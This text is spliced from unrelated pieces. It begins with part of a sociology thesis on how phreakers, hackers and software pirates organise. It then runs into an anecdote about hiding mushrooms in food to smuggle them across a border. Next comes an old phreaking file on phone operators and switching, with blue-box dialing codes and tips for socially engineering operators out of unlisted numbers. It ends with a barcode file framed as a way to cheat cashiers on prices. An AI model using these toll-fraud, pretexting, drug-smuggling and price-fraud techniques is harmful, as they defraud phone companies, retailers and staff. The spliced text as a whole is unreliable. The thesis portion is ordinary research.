numbers. The                 security of some VMB systems is notoriously poor. Many                 phreaks have expertise in  creating  boxes for                 themselves that are unknown  until discovered  by the                 owner of the system. However, these boxes are usually                 short lived since discovery by the system operator, and                 closure of the box, is only a matter of time. But as                 long as the box is functioning, it can serve as a means                 of communicating with others.  VMB numbers are                 frequently posted on bulletin boards with invitations                 to  call if you have any good stuff.   They are often                 used by pirates to exchange messages about new releases                 of software, and by phreak hackers to trade account and                 access numbers.  Additionally, some of the underground                 newsletters and journals obtain boxes so users can call                 in news of arrests and other gossip.                                                                          63                      Like bulletin boards, VMBs are systems that allow                 information to be disseminated to a large number of                 associates, and unlike the live telephone conversations                 of bridges and loops, they are available at any time of                 the day.  Additionally, VMB's don't require use of a                 computer and modem, only a touch tone phone is needed                 to call the box.  Their usefulness is limited somewhat                 because they play only one  outgoing  message at a                 time, and their transitory nature limits their                 reliability.                   Summary                      Phreakers, hackers and pirates do not act as                 loners.  They have adopted existing methods of                 communication, consistent with their skills in high                 technology, to form a social network that allows for                 the exchange of information, the socialization of new                 members, socializing with others, and in the case of                 pirates, performing the  deviant  act itself via these                 means.                      These communication points create and foster                 groups of loosely associated individuals, with specific                 interests, coming together to exchange information                 and or software. It is impossible to be a part of the                 social network of the computer underground and be a                 loner.   Based upon the Best and Luckenbill measure,                                                                          64                 actors in the computer underground, by displaying                 mutual association, organize as colleagues.                      The social network of the computer underground                 provides the opportunity for colleagues to form                 cooperative working relationships with others, thus                 moving the CU towards a more sophisticated form of                 social organization.  These  hacker groups  are                 addressed in the next section.                                                                          65                                      Mutual Participation                      In the previous chapter the ways in which the                 structure of the computer underground fosters mutual                 association  were discussed. Their social outlets and                 means for informational exchange bring the CU community                 together as deviant colleagues.  Their relationships                 fit quite well into the Best and Luckenbill  1982                  typology of collegial associations                       The relationship between deviant colleagues                     involves limited contact.  Like loners,                     colleagues perform their deviant acts alone.                     But unlike loners colleagues associate with                     one another when they are not engaged in                     deviance . . . In effect, there is a division                     between two settings  onstage where                     individual performs alone  and backstage,                     where colleagues meet  cf Goffman .  In their                     backstage meetings, colleagues discuss                     matters of common interest, including                     techniques for performing effectively, common                     problems and how to deal with them, and ways                     of coping with the outside world  1982 p.37 .                      However, despite the advantages of collegial                 association, ties between CU participants are weak.                 Loyalty between individuals seems rare, as the CU is                 replete with tales of phreak hackers who, when                 apprehended, expose identities or  trade secrets  in                 order to avoid prosecution.  These weak collegial ties                 may be fostered by the anonymity of CU communication                 methods, and the fact that all CU actors are, to some                                                                          66                 extent, in competition with each other. There are only                 so many systems with weak security and once such a                 system is found, sharing it with others will virtually                 ensure that the hole will be sealed when the increased                 activity is noticed.  Thus while p hackers will share                 general knowledge with each other, specific information                 is not disseminated publicly.                      As Best and Luckenbill have observed, in order to                 remain in a collegial relationship individuals must be                 able to successfully carry out operations alone  1982                 p.45 . In order to sustain a career in p hacking one                 must pursue and collect information independent of what                 is shared on the communication channels.  Despite the                 association with other phreakers and hackers, the                 actual performance of the phreak hacking act is a                 solitary activity.22                      That is not to say, however, that p hackers never                 share specific information with others.  As discussed                 earlier, p hack bulletin board systems frequently have                 differentiated levels of access where only highly                 regarded individuals are able to leave and read                 messages. These areas are frequently used to keep                ____________________                      22 This does not hold true for pirates. By                definition they must trade programs with other                individuals.                                                                           67                 information from  unskilled  users at the lower levels.                 There are strong social norms that some information                 should not be shared too widely, as it may be either                  abused  or fall into the hands of enforcement agents.                 For example, when one p hacker announced that he was                 going to release a tutorial on how to infiltrate a new                 telephone company computer, he received the following                 messages in reply                       Not smart, DT.  That computer  is a system                     which can be quite powerful if used to its                     potential. I don't think that information on                     programming the switches should be released                     to anyone. Do you realize how destructive                      that computer  could really be if used by                     someone who is irresponsible and intends on                     destroying things  Don't even think about                     releasing that file. If you do release that                     file, it will disappear and will no longer                     remain in circulation. Believe me. Not many                     have the right to know about  that computer ,                     or any other delicate telco computers for                     that matter. Why do you think the fucking New                     York Times published that big article on                     hackers screwing around with telco machines                      Not only will you get into a lot of trouble                     by releasing that file on  computer , you                     will be making telcos more aware of what is                     actually happening, and soon no one will be                     able to learn about their systems.

Keep that to yourself it will just mess it up                     for others  UU, message log, 1988 .                                                                           68                       The desire to share information with selected                 colleagues often leads to the formation of cooperative                  working groups.  These partnerships are easily formed,                 as the structure of mutual association in the CU                 creates a means where  talent  can be judged on the                 basis of past interactions, longevity in the field, and                 mutual interests. When allegiances are formed, the CU                 actors begin  mutual participating  in their acts, thus                 becoming  peers  in terms of social organization.                      Mutual participation, as defined in the Best and                 Luckenbill typology, is exhibited by actors sharing in                 the same deviant act, in the physical presence of one                 another  1982 p.45 .  However, the measurement was                  grounded  in studies of traditional deviant                 associations  eg   street gangs, prostitutes, etc.                  where  real time  interaction is common. The technology                 used by the CU negates this requirement as actors can                 be located in different parts of the country.                 Additionally,  hacking  on a system, by a group of                 peers, does not require simultaneous participation by                 all members.  However Best and Luckenbill's typology is                 an ideal type, and the activities of peers in the                 computer underground do not fall outside of the spirit                 or intention of their concept of mutual participation.                 Their description of deviant peer associations is                                                                          69                 presented here                       Deviant peers are distinguished from                     colleagues by their shared participation in                     deviance.  While colleagues carry out their                     deviant operations alone, peers commit                     deviant acts in one another's presence.                     Peers cooperate in carrying out deviant                     operations, but they have a minimal division                     of labor, with each individual making roughly                     comparable contribution.  Peer relationships                     also tend to be egalitarian and informal                      some peers may be acknowledged leaders or                     admired for their skill, but there is no set                     division of authority.  Like colleagues,                     peers share subcultural knowledge, but peer                     groups typically provide their members with                     more support.  In addition to cooperating in                     deviant operations, peers may recruit and                     socialize newcomers and supply one another                     with deviant equipment and social support.                     Thus, the bonds between peers are stronger                     than those linking colleagues  1982, p.45 .                      Peer associations in the CU are largely limited to                 small groups23 working on a specified goal.  Both                 pirates and p hackers organize themselves in this                 regard, though their characteristics differ.  We begin                 with a discussion of mutual participation among                 pirates.                   Pirate Groups                      Pirate groups are composed of less than ten                ____________________                      23 In terms of the ideal type for deviant peers                any two individuals working in cooperation exhibit                mutual participation. The discussion here addresses                groups that consist of three or more people that                identify themselves as a sort of  club.  Short lived                interaction between two people is not considered a                 group  in the CU culture.                                                                           70                 members.  Their primary purpose is to obtain the latest                 software, remove any copy protection from it, and then                 distribute it to the pirate community.  Often the                  warez  that they distribute will be adorned with the                 group name, so subsequent users will be aware of the                 source of the software.  Many pirate groups have  home                  BBS systems that act as key distribution points, and as                 places where outsiders can communicate with members of                 the association. This researcher was unable to obtain                 data about the internal organization of pirate groups,                 but it appears that they are leaderless, with                 individual members working alone but giving credit to                 the group as a whole.                   Phreak hack groups                 The existence of phreak hacker groups is well                 documented in the data, and has been heavily reported                 in the media.  Two hacker groups in particular, The                 414's  named for the Wisconsin area code in which they                 lived , and The Inner Circle, received a large amount                 of press after being apprehended for various computer                 break ins.  However, the  threat  that such groups                 represent has probably been overstated as the data                 indicate that  hacker gangs  vary greatly in                 organization and dedication to the CU enterprise.                      Many hacker groups are short lived associations of                                                                          71                 convenience, much like the  no girls allowed!  clubs                 formed by young boys.  They often consist of four to                 nine beginning phreak hackers who will assist each                 other in obtaining telephone credit card numbers. By                 pooling their resources, a large number of illicit                  codez  can be obtained and shared with others.                 Distribution of the account numbers is not limited to                 the group, they are often shared with the community at                 large,  courtesy of Codez Kidz Ltd.  Groups of this                 type are looked at with disdain by  elite                  phreak hackers and are often criticized as being more                 interested in self promotion then they are with                 actually phreaking or hacking.                      Some hacker groups are very proficient and                 dedicated to their craft, however. These groups are                 characterized by smaller memberships, less visibility                 to non members, and commitment to the CU enterprise.                 They are loosely organized, yet some have managed to                 exist six or more years despite members dropping out or                 being arrested. These  elite  groups are selective                 about membership, and cite trust and talent as the two                 leading requirements for joining                       The group exists mainly for information                     trading. If you trust everyone else in the                     group, it is very profitable to pool                     information on systems . . . also it is nice                     to know someone that you can call if you need                     help on operating system X and to have people                                                                          72                      feel free to call you if they need help on                     operating system Y  AN, message log, 1988 .                      Trust is a very important part of a group. I                     think that's blatantly obvious. You have to                     be able to trust the other members of the                     group with the information you are providing                     in order to be productive, and have a secure                     situation  UU, message log, 1988 .                      . . . all groups serve the same purpose  to                     make their members feel better about                     themselves  like, wow, I'm in a group  and to                     trade things, whether it's wares, codes, or                     whatever. But the thing is that being in a                     group is like saying  I trust you, so like,                     what can we do together    NN, message log,                     1988                       Indeed, hacker groups are formed primarily for the                 purpose of information exchange.  To this end, groups                 attempt to recruit members with a wide variety of                  specializations  in order to have a better support                 network to turn to                        Our group  has always been very selective                     about members  took me six years to get in .                     The only reason the group exists is to bring                     together a diverse group of talents. There is                     very little overlap in  the group  these                     days.  Everyone has one thing that they are                     the best in the country at, and are                     conversant with just about any other form of                     hacking.  As an example, I got into a Primos                     computer this morning around 9 am. Once I got                     in, I know enough about Primos to get around,                     but that's it. So I call  PS  in New York,                     give him the info, and when I get home                     tonight, he has gotten in and decrypted the                     entire username password file and uploaded it                     to me.  But two weeks ago he got into a VAX.                     He got the account to me, I called it up and                     set up three backdoors into the system that                     we can get in if the account is detected or                     deleted.  Simple matter of communism.  From                     each according to his ability . . . etc. Also                                                                          73                      it helps that everyone in the group is                     experienced enough that they don't fuck up                     accounts you spend all day getting  TM, field                     notes, 1989 .                      Consistent with the Best and Luckenbill ideal                 type, hacker groups do not exhibit a set division of                 authority or labor. Most groups are leaderless, and                 every member is free to pursue their own interests,                 involving other members of the group only when desired                       We just got our group together.  We've got a                     guy that does VMB's and a Sprinter  obtains                      codez  from U.S. Sprint  and a couple of                     hackers.  Everybody's free to pursue whatever                     system they want but if they want or need                     some help they can call on any of the other                     members if they want to. Like if one guy is                     scanning and finds a VAX he might call and                     give me the dialup.  Then I might have to                     call our Sprinter to get some codez so I can                     start hacking on it.  Once I get through I'll                     give the account to the other members.  But                     if I found it myself I wouldn't have to give                     it out but I probably would anyway 'cuz                     keeping it would be bullshit  DC, field                     notes, 1988 .                      There isn't a leader really.  The guy who                     starts the group sort of acts like a contact                     point but everyone else has everyones' phone                     number and you can call whoever you want to                     anytime.  Usually when you're putting a group                     together you just get everyone you want and                     you all decide on a name.  DC, field notes,                     1988 .                   Summary                      By virtue of the extensive social network found in                 the CU, some participants form work groups.  The                 sophistication of these groups varies, but in all cases                                                                          74                 it is evident that the groups exist to support what are                 primarily individually performed activities.  The                 groups exhibit many of the ideal type characteristics                 of peer associations, and it is clear that in some                 cases the computer underground is socially organized as                 peers.                                                                            75                                           Conclusion                      Phreakers, hackers, and pirates do not act as                 loners.  Loners do not associate with others, and are                 on their own in coping with the practical problems                 presented by their activities  Best and Luckenbill                 1982, p.28 .  From the data presented here, it is                 evident that the computer underground has established                 an extensive social network for the exchange of                 resources and mutual support.  The characteristics of                 the CU varies according to the goals of the                 participants, but the presence of mutual association is                 consistent. Contact between individuals is limited,                 with the acts of phreaking or hacking being committed                 alone.  Computer underground participants do associate                 with one another in order to discuss matters of common                 interest, such as performance techniques, news, and                 problem solving.  To facilitate this informational                 exchange, they have established a technologically                 sophisticated network that utilizes computer bulletin                 boards, voice mail boxes, telephone bridges, and                 telephone loops.                      The collegial organization of the computer                 underground is further evidenced by the establishment                 of a CU culture. The subcultural adaptation of                                                                          76                 language, expectations of normative conduct, and status                 stratification based on mastery of cultural knowledge                 and skill, all indicate that the computer underground                 is, at the very least, a social organization of                 colleagues  see Best and Luckenbill, 1982, p.37 .                      The very structure that permits mutual association                 among CU participants also encourages some to form                 working relationships, thus acting as peers by mutually                 participating in CU activities. Peers organized in this                 manner share in their deviance, organizing informally                 with little division of labor or set division of                 authority  Best and Luckenbill, 1982, p.45 .  These                 peer associations provide support to members, and can                 provide socialization and recruitment functions for                 newcomers. The establishment of work groups, through                 mutual participation, indicates that though the                 computer underground is largely organized as a network                 of colleagues, it is also, to some degree, a social                 organization of peers.                      Best and Luckenbill  1982  describe two additional                 forms of deviant associations that are more                 organizationally sophisticated than peers   mobs  and                  formal organizations.  The computer underground,                 however, does not display the requisite characteristics                 of these organizational types.  The primary                                                                          77                 characteristic of  mobs  is an elaborate division of                 labor  Best and Luckenbill, 1982, p.25 .  While some CU                 groups do exhibit a rudimentary division of labor based                 on individual members' specialization, it is not by any                 means  elaborate.   Any division of labor that does                 exist is voluntary and arises on the basis of                 specialized knowledge, not a specialized organizational                 role.                      In much the same manner the lack of a designated                 leader or leadership hierarchy prevents CU groups from                 being categorized as  formal organizations  in the Best                 and Luckenbill typology.  Deviant organizations at this                 level are quite sophisticated and there is no empirical                 evidence that the computer underground is organized in                 this manner.                      This study of the computer underground has been a                 test of the Best and Luckenbill typology of the social                 organization of deviants.  As a test of their                 organizational indicators, the CU has shown that the                 categories are well constructed, with the possible                 exception of limiting  mutual participation  to acts                 carried out in the presence of others.  However, if we                 modify this to include non simultaneous, but                 cooperative, acts as found in phreak hacker groups, the                 category is otherwise robust.  The flexibility of the                                                                          78                 typology, which explicitly recognizes that not all                 deviant associations will display all of the character                  istics  Best and Luckenbill, 1982, p.25 , is a strength                 that allowed it to be easily used in terms of the                 computer underground.                      By addressing the CU from a social organizational                 viewpoint we have seen that despite the high technology                 trappings of their craft, pirates, phreakers, and                 hackers display organizational characteristics found in                 other groups that have been criminalized.  This may                 suggest that the development of sophisticated tools to                 commit  crime  does not necessarily affect the ways in                 which individuals organize their activities.                      The implications of peer and collegial                 organization for the members of the computer                 underground are vast.  The level of sophistication has                 a direct relationship to the types of resources on                 which individuals can draw  Best and Luckenbill, 1982,                 p.54 .  Because CU members are mutually associated,                 they are able to turn to colleagues for advice and                 support with various problems.  However, at the                 collegial level they are left to enact the solutions                 independently.  Whether or not they are successful in                 doing so will determine if they choose to remain active                 in the computer underground.  The data show that                                                                          79                 involvement in the CU is short in duration, unless                 success in early phreak hack attempts is obtained.  As                 long as the CU remains organized as a collection of                 colleagues, this trend will continue.  Additionally, as                 the computer and telephone industries become more                 sophisticated in preventing the unauthorized use of                 their facilities, new phreak hackers are unlikely to                 succeed in their initial attempts at the act, thus                 dropping away from the activity and never becoming                 acculturated to the point where peer relationships can                 be developed.                      At the peer level, a dimension of sophistication                 that some members of the CU do display, the knowledge                 and resources to solve problems and obtain resources is                 greater.  However, even at this level the ties between                 peers remain weak at best.  Although their cooperative                 ties allow for more sophisticated operations, and                 somewhat reduce the CU's vulnerability to social                 control agents  Best and Luckenbill, 1982, p.53 , it                 still does not completely eliminate the need for                 individual success in order to sustain a CU career.  As                 long as the CU remains at the current level of                 organizational sophistication, with weak ties and                 somewhat limited means of support and resource                 attainment, it will continue to be a transitory and                                                                          80                 limited  criminal  enterprise.                      This realization should be considered by policy                 makers who desire to further criminalize computer                 underground activities. Given the current organization                 of the CU, the future social costs of their actions are                 not likely to expand beyond the current level.  There                 is no evidence to support assertions that the CU is                 expanding, and the insight provided here shows that it                 is not likely to do so on a large scale.                      For sociologists, the computer underground is a                 field rich for insight into several areas of concern.                 Future research into the career path of CU members, and                 the relationships between individuals, could prove                 helpful to those interested in applying theories of                 differential association and career deviance.                 Additionally, the computer underground provides a                 unique opportunity to study the process of                 criminalization, and its effect on those who are                 engaged in the behavior.

A friend of mune from Toronto put 1 2 oz of 'shrooms into a taboule  sp   salad a day before crossing the border to Buffalo.  By the time we got to the border, the 'shrooms had swelled up and just looked like... well, mushrooms.   So we all pigged out on the floor in Rich stadium before the show.  They worked just fine!  I think the only factor to consider is the full stomach empty stomach thing that's a factor in any drug eating.  If you eat six pieces of pizza, with a certain ammount of drug, you'll take longer to get off than the same ammount of drug on 1 piece.  Hmmm.  Suddenly, I'm come over all peckish.

OPERATORS              There are many types of operators in The Network and the more common ones will be discussed.  TSPS Operator   The TSPS   Traffic Service Position System  as opposed to This Shitty Phone Service  Operator is probably the bitch  or bastard for the phemale liberationists  that most of us are use to having to deal with.  Here are her responsibilities   1  Obtaining billing information for Calling Card or 3rd number calls.  2  Identifying called customer on person to person calls.  3  Obtaining acceptance of charges on collect calls.  4  Identifying calling numbers.  This only happens when the calling   is not    automatically recorded by CAMA   Centralized Automatic Message Accounting       forwarded from the local office.  This could be caused by equipment failures     ANIF   Automatic Number Identification Failure  or if the office is not    equipped for CAMA  ONI   Operator Number Identification .     I once had an equipment failure happen to me   the TSPS operator came on and said,  What   are you calling FROM    Out of curiosity, I gave her the   to my CO, she thanked me   then I was connected to a conversion that appeared to be between a frameman   his wife.  Then it started ringing the party I originally wanted to call   everyone phreaked out  excuse the pun . I immediately dropped this dual line conference!   You shouldn't mess with the TSPS operator since she KNOWS where you are calling from.  Your number will show up on a 10 digit LED read out  ANI board  She also  knows whether or not you are at a fortress fone   she can trace calls quite readily.  Out of all the operators, she is one of the MOST DANGEROUS.  INWARD Operator   This operator assists your local TSPS   O   operator in connecting calls. She will never question a call as long as the call is within HER SERVICE AREA. She can only be reached via other operators or by a Blue Box.  From a BB, you would dial KP NPA 121 ST for the INWARD operator that will help you connect any calls within that NPA only.  Blue Boxing will be discussed in a future part of BASIC TELCOM   DIRECTORY ASSISTANCE Operator   This is the operator that you are connected to when you dial   411 or NPA 555 1212.  She does not readily know where you are calling from.  She does not have access to unlisted  's, but she does know if an unlisted   exists for a certain listing.  There is also a directory assistance for deaf people who use Teletypewriters If your modem can transfer BAUDOT   45.5 baud    the Apple Cat can  , then you can call him her up and have an interesting conversation. The   is  800 855 1155. They uses the standard Telex abbreviations such as GA for Go Ahead. They tend to be nicer   will talk longer than your regular operators. Also, they are more vulnerable into being talked out of information through the process of  social engineering  as Cheshire Catalyst would put it.   Unfortunately, they do not have access to much.  I once bullshitted with one of these operators and I found out that there are 2 such DA offices that handle TTY.  One is in Philadelphia and the other is in California.  They have approximately 7 operators each.  Most of the TTY operators think their job is boring  based on an official  BIOC poll  .  They also feel they are under paid. They actually call up a regular DA   to process your request  Sorry, no fancy computers! .   Other operators have access to their own DA by dialing KP NPA 131 ST  MF .  In the confusion due to the aftermath of the Bell System break up, it seems that it will now cost 50 cents per DA call!  Exceptions seem to be Canadian DA   the TTY DA  for the time being . Thus you might be able to avoid being charged for DA calls by using your computer  running at 45.5 baud!  and their 800 TOLL FREE  !  If they decide to charge from fortresses also, the method of making DA calls from the fortress and purposely asking for an unlisted   so you can have the operator credit you home   will no longer work!   CN A Operators   CN A operators are operators that do exactly the opposite of what directory assistance operators are for.  See part II, for more info on CN A    's.  In my experiences, these operators know more than the DA op's do   they are more susceptible to  social engineering.  It is possible to bullshit a CN A operator for the NON PUB DA    ie, you give them the name   they give you the unlisted   .  This is due to the fact that they assume your are a phellow company employee.  Unfortunately, the break up has resulted in the break up of a few NON PUB  's and policy changes in CN A.  INTERCEPT Operator   The intercept operator is the one that you are connected to when there are not enough recordings available to tell you that the   has been disconnected or changed.  She usually says,  What   you callin'   with a foreign accent.  This is the lowest operator lifeform.  Even though they don't know where you are calling from, it is a waste of your time to try to verbally abuse them since they usually understand very little English.  Incidentally, a few areas do have intelligent intercept operators.  OTHER Operators   And then there are the   Mobile,Ship to Shore, Conference, Marine Verify,  Leave Word   Call Back,  Rout   Rate  KP 800 141 1212 ST   new   as result of Bell breakup ,   other special operators who have one purpose or another in the  Network.  Problems with an Operator   Ask to speak to their supervisor...or better yet, the Group Chief  who is the highest ranking official in any office  who is the equivalent of the Madame in a whorehouse  if you will excuse the analogy .  By the way, some CO's that will allow you to dial a 1 or 0 as the 4th digit, will also allow you to call special operators   other phun Telco  's without a blue box.  This is very rare though!  For example, 212 121 1111 will get you a NY Inward Operator.                       OFFICE HIERARCHY                      Every switching office in North America  the NPA system , is assigned an office name   class.  There are five classes of offices numbered 1 through 5.  Your CO is most likely a class 5 or end office. All Long Distance  Toll  calls are switched by a toll office which can be a class 4, 3, 2, or 1 office.  There is also a 4X office called an intermediate point.  The 4X office is a digital one that can have an unattended exchange attached to it  known as a Remote Switching Unit RSU .  The following chart will list the Office  , name,   how many of those offices existed in North America in 1981.  Class       Name       Abb    Existing                                           1   Regional Center  RC         12   2   Sectional Center SC         67   3   Primary Center   PC        230   4   Toll Center      TC      1,300   4P  Toll Point       TP   4X  Intermediate Pt  IP   5   End Office       EO     19,000   R   RSU              RSU  When connecting a call from one party to another,the switching equipment usually tries to find the shortest route between the Class 5 end office of the caller   the Class 5 end office of the called party.  If no inter office trunks exist between the 2 parties, it will then move upto the next highest office for servicing  Class 4 .  If the Class 4 office cannot handle the call by sending it to another Class 4 or 5 office, it will be sent to the next office in the hierarchy  3 .  The switching equipment first uses the high usage  interoffice trunk groups, if they are busy it then goes to the final trunk groups on the next highest level. If the call cannot be connected then, you will probably get a re order  120 IPM  Interruptions Per Minute  busy signal  signal.  At this time, the guys at Network Operations are probably shitting in their pants and trying to avoid the dreaded Network Dreadlock  as seen on TV! .  It is also interesting to note that 9 connections in tandem is called ring around the rosy and it has never occurred in telephone history.  This would cause an endless loop connection.  a neat way to really screw up the Network   The 10 regional centers in the US   the 2 in Canada are all interconnected. They form the foundation of the entire telephone network.  Since there are only 12 of them, they are listed below   Class 1 Regional Office Location    NPA                                         Dallas 4 ESS                        214 Wayne, PA                           215 Denver 4T                           303 Regina No.2 SP1 4W    Canada        306 St. Louis 4T                        314 Rockdale, GA                        404 Pittsburgh 4E                       412 Montreal No.1 4AETS   Canada        504 Norwich, NY                         607 San Bernardino, CA                  714 Norway, IL                          815 White Plains 4T, NY                 914  The following diagram demonstrates how the various offices may be connected                                         Regional              _!_        _!_        _!_Offices              !1!        !1!        !1!                                                           !

SWITCHING EQUIPMENT                         In the Network, there are 3 major types of switching equipment.  They are known as   Step, Crossbar,   ESS.   STEP BY STEP  SxS   The Step By Step, a k a the Strowger switch or two motion switch, was invented in 1889 by an undertaker named Almon Strowger.  He invented this mechanical switching equipment because he felt that the biased operator was routing all requests for an 'undertaker' to her husband's business.  Bell started using this system in 1918   as of 1978, over 53  of the Bell exchanges used this method of switching.  This figure is probably substantially less now.  Step by Step switching is controlled directly by the dial pulses which move a series of switches  called the switch train  in order.  When you first pick up the fone under SxS, a linefinder acknowledges the request  sooner or later  by sending a dial tone.  If you then dialed 1234, the equipment would first find an idle selector switch.  It would then move vertically 1 pulse, it would then move horizontally to find a free second selector, it would then move 2 vertical pulses, step horizontally to find the next selector, etc.  Thus the first switch in the train takes no digits, the second switch takes 1 digit, the third switch takes 1 digit,   the last switch in the train  called the connector  takes the last 2 digits   connects your calls. A normal  10,000 line  exchange requires 4 digits  0000 9999  to connect a local call   thus it takes 4 switches to connect every call  linefinder, 1st   2nd selectors,   the connector  .  While it was the first, SxS sucks for the following reasons    1  The switches often become jammed thus the calls often become blocked.   2  You can't use DTMF  Dual Tone Multi Frequency a k a Touch Tone  directly. It is possible that the Telco may have installed a conversion kit but then the calls will go through just as slow as pulse, anyway!   3  They use a lot of electricity   mechanical maintenance.  bad from Telco point of view    4  Everything is hardwired.  They can still hook up pen registers   other shit on the line so it is not exactly a phreak haven.  You can identify SxS offices by    1  Lack of DTMF or pulsing digits after dialing DTMF.   2  If you go near the CO, it will sound like a typewriter testing factory.   3  Lack of speed calling, call forwarding,   other custom services.   4  Fortress fones that want your money first  as opposed to dial tone first ones .  The preceding don't necessarily imply that you have SxS but they surely give evidence that it might be.  Also, if any of the above characteristics exist, it certainly isn't ESS!  Also, SxS have pretty much been eradicated from large metropolitan areas such as NYC  212 .   CROSSBAR   There are 3 major types of Crossbar systems called   No. 1 Crossbar  1XB , No. 4 Crossbar  4XB ,   No. 5 Crossbar  5XB .  5XB has been the primary end office switch of Bell since the 60's and thus it is in wide use.  There is also a Crossbar Tandem  XBT  used for toll switching.  Crossbar uses a common control switching method.  When there is an incoming call, a stored program determines its route through the switching matrix.  In Crossbar, the basic operation principle is that a horizontal   a vertical line are energized in a matrix known as the crosspoint matrix. The point where these 2 lines meet in the matrix is the connection.          ESS                                 Electronic  Switching System  ESS                           The Phreak's Nightmare Come True                        or Orwell's Prophecy as 2600 puts it    ESS is Bell's move towards the Airstrip One society depicted in Orwell's 1984.  With ESS, EVERY single digit that you dial is recorded  even if it is a mistake.  They know who you call, when you call, how long you talked for,   probably what you talked about  in some cases .  ESS can  and is  also programmed to print out  's of people who make excessive calls to 800  's or directory assistance.  This is called the  800 Exceptional Calling Report.  ESS could also be programmed to print out logs of who calls certain  's  like a bookie, a known communist, a BBS, etc The thing to remember with ESS is that it is a series of programs working together.  These programs can be very easily changed to do whatever they want it to do. This system makes the job of Bell Security, the FBI, NSA,   other organizations that like to invade privacy incredibly easy.  With ESS, tracing is done in microseconds  Eine Augenblick    the results are printed at the console of a Bell Gestapo officer.  ESS will also pick up any  foreign  tones on the line such as 2600 Hz!  Bell predicts that the country will become totally ESS by the 1990's.  You can identify ESS by the following which are usually ESS functions    1  Dialing 911 for help.  2  Dial Tone First fortresses.  3  Custom Calling Services such as  Call Forwarding, Speed Dialing,   Call     Waiting.   Ask your business office if you can get these.   4  ANI  Automatic Number Identification  on LD calls.  Phreaking does not come to a complete halt under ESS though  just be very careful, though!!!  Due to the fact that ESS has a computer generated  artificial  ring, you are not directly connected to the called parties line until he picks up. Therefore, Black Boxes   Infinity Transmitters will not work under ESS!  NOTE   Another interesting way to find out what type of equipment you are on is        to raid the trash can of you local CO  this art will discussed in a        separate article soon. Asking for a tour of your CO for a  school        report  can also be helpful.  Coming Soon   In the part V, we will start to take a look at telephone electronics.

You know, it's that set of black bars you see on virtually every product whenever you go to the grocery store, to buy a book or a magazine, or even to buy software  assuming that you do, indeed, BUY your software .  Have you ever though of what fun you could have by altering that little set of black bars   If you were lucky enough, you might be able to slip a box of industrial size laundry detergent by that dizzy 16  year old girl at the Safeway and have the computer charge you the price of a pack of Juicy Fruit, or some other such mischief.  Well, to help you in your explorations of How To Screw Over Others In This Grand Old Computerized World of Ours, I proudly present HOW TO CRACK TO UPC CODE.  Use the information contained herein as you will.  You will need the file UPC.PIC, hopefully available from the same place you found this file.  And so, let's begin   When the lady at the corner market runs the package over the scanner  or whatever it is they do in your area , the computerized cash register reads the UPC code as a string of binary digits.  First it finds the  frame bars    a sequence of  101   see A on picture .  There are three sets of frame bars on any given code...one on either side, and one in the center.  These do nothing but set off the rest of the data, and are the same on any UPC code.  Next is the  number system character  digit, which is encoded in leftside code  see later .  This digit tells the computer what type of merchandise is being purchased.  The digits and their meanings are           0         Ordinary grocery items. Bread, magazines, soup, etc.         2         Variable weight items.  Meats, fruits   veggies, etc.         3         Health items.  Aspirin, bandaids, tampons, etc.         5         Cents off coupon.   Not sure how this works .  The next cluster of digits is the manufacturer number, again stored in leftside code.  THere are five digits here all the time.  Some numbers include 51000 for Campbell's Soup, 14024 for Ziff Davis publishing  Creative Computing, A... , and 51051 for Infocom.  The next five digits  after the frame bars  are the product size id number.  The number for  The Hitchhiker's Guide to the Galaxy  from Infocom is 01191.  These digits are stored in rightside code.  Finally there is the checksum, in rightside, which will be discussed later.  Now, why are there two types of codes, leftside and rightside   That's so the person at the checkout counter can slide the thing by the scanner any way she pleases.  By having different codings for either side the computer can tell the right value no matter how the digits are read in.  Here are the codes for the digits 0 through 9         Digit             Leftside code           Rightside code         0                  0001101                 1110010         1                  0011001                 1100110         2                  0010011                 1101100         3                  0111101                 1000010         4                  0100011                 1011100         5                  0110001                 1001110         6                  0101111                 1010000         7                  0111011                 1000100         8                  0110111                 1001000         9                  0001011                 1110100  The more observant among you may have noticed that Rightside code is nothing more than logical NOTed Leftside code, i.e., a 0 in Leftside is a 1 in Right  side, and vice versa.  Later on we will discuss another type called Reversed Rightside, in which the binary values in Rightside are reversed, meaning that 1110100  9  in Rightside would be 0010111 in Reversed Rightside.  RR is used only when there is an extra set of codes off to the right of the main code bars, as with books and magazines.  Now we see the hard part  how the checksum digit is encoded.  Let's try working out the checksum for  Hitchhiker's Guide .  First, notice the Number System Character.  Software is considered a Grocery Item by UPC, so the NSC is 0  zero .  Next, Infocom's Manufacturer's Number is 51051, and the game's id number is 01191.  Good enough.  Set together, these numbers look like this           0 51051 01191  Now, take the digits of the code and write them on alternate lines, odd on one line, even below, giving this           0 1 5 0 1 1          5 0 1 1 9  Now add each set of numbers           0 1 5 0 1 1   8          5 0 1 1 9   16  Multiply the first number  the ones created by adding the first, third, etc digits  by three           8x3   24  And add that to the result of the other number  second, fourth, etc digits added together            24 16 40  Subtract this from the next higher or equal multiple of 10  40 in this case           40 40 0  And the remainder, here 0  zero , is the checksum digit.  Now, what if there's a set of other bars off to the side   These are encoded in another format which uses Reversed Rightside  as described above  instead of standard Rightside.  For books, the sequence is as follows           Five digits         Starts with 1011         If  first digit is even  then                 sequence is L RR L L RR         else                 sequence is RR L L RR L         each digit is separated with 01  Therefore, the sequence for 29656 is           1011 0010011 01 0010111 01 0101111 01 0110001 01 0000101                2L         9RR        6L         5L         6RR  and the sequence for 14032 is           1011 0110011 01 0100011 01 0001101 01 0100001 01 0010011                1RR        4L         0L         3RR        2L  Naturally, all these bars are run together.  There is no checksum.  For magazines, the sequence is even more complex.  There are two digits in each bar, and the numbers usually run from 1 12, signifying the month. The first digits are encoded thusly           L if the digit is 1,4,5,8 or 9 and         RR if the digit is 2,3,6,7 or 0.  The second digit is coded in L if it is even, and RR if it is odd. Therefore, 06 codes as           1011 0100111 01 0101111  and 11 codes as           1011 0110011 01 0110011  No checksum here, either, and the fields are again separated by 01.  Well, that about does it for this explanation of how to crack the UPC codes. Use this information as you will, and forward any question to THE SPACE BAR, 505 265 5178, pw BANZAI.  Enjoy!

